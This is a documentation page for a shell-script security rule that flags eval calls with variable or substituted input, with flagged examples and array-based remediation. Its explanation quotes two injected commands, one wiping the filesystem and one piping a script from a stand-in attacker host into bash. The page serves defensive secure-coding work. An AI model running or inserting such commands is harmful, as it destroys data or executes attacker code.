---
title: "VNX-BASH-001 – eval with Potentially User-Controlled Input"
description: "Detects eval calls that use a variable, command substitution, or concatenation rather than a static string literal, enabling arbitrary shell command injection if any part of the evaluated string originates from external input."
---

## Overview

This rule flags any use of `eval` in Bash or shell scripts where the argument is not a plain static string literal. Specifically, it matches lines where `eval` is followed by anything containing a `$` variable reference, a backtick or `$(...)` command substitution, or string concatenation — and it excludes lines that are commented out or that consist solely of a literal string with no variable interpolation.

`eval` causes the shell to re-parse and execute its argument as a new shell command. When the string passed to `eval` contains any portion derived from user input, an environment variable set by an untrusted source, a file path, or the output of an external command, an attacker who controls that portion can inject arbitrary shell commands that execute with the script's full privileges. This vulnerability maps to CWE-78 (Improper Neutralisation of Special Elements used in an OS Command).

**Severity:** Critical | **CWE:** [CWE-78 – Improper Neutralisation of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)

## Why This Matters

`eval` is one of the most dangerous constructs in shell scripting precisely because it grants the programmer the ability to construct commands dynamically — and grants an attacker the same ability. Command injection via `eval` requires no memory corruption or kernel exploits: if the attacker can influence any byte of the string being evaluated, they can append `; rm -rf /`, `; curl attacker.com/shell | bash`, or any other command, and it will execute with the full permissions of the running process.

Real-world examples include CI/CD pipeline injection attacks where environment variable values set by pull request metadata (branch names, commit messages) were passed unquoted into `eval` inside build scripts, allowing attackers to exfiltrate secrets from the CI runner. The ShellShock vulnerability (CVE-2014-6271) was itself a form of `eval`-equivalent behaviour in Bash function export handling. ATT&CK technique T1059.004 (Unix Shell) covers this class of command injection via shell interpreter abuse.

Even when you believe you control the input, dynamic `eval` is a maintenance hazard: future refactoring may introduce a new code path that feeds external input into the evaluated string without the author realising the security implication.

## What Gets Flagged

```bash
# FLAGGED: variable interpolated into eval
eval "$user_command"

# FLAGGED: command substitution result passed to eval
eval $(get_config_value "cmd")

# FLAGGED: concatenation with variable
eval "docker run $IMAGE_NAME"
```

## Remediation

1. **Eliminate `eval` entirely.** Most uses of `eval` can be replaced with arrays, `declare`, parameter expansion, or direct command invocation.

2. **Use arrays for dynamic command construction.** Build a command as a Bash array and execute it directly instead of constructing a string.

3. **If `eval` is genuinely necessary**, restrict it to a static string you control entirely. Never allow any externally sourced value to appear inside the evaluated string.

```bash
# SAFE: use an array to build dynamic commands without eval
cmd_args=("docker" "run" "--rm")
if [[ "$debug" == "true" ]]; then
    cmd_args+=("--entrypoint" "bash")
fi
cmd_args+=("$IMAGE_NAME")
"${cmd_args[@]}"

# SAFE: eval only a known-static string (no variables)
eval "set -euo pipefail"
```

## References

- [CWE-78: Improper Neutralisation of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [ShellCheck SC2050 / SC2046 – eval and word-splitting warnings](https://www.shellcheck.net/wiki/SC2046)
- [OWASP – Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [BashFAQ/048 – Why should eval be avoided in Bash?](https://mywiki.wooledge.org/BashFAQ/048)
- [MITRE ATT&CK T1059.004 – Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
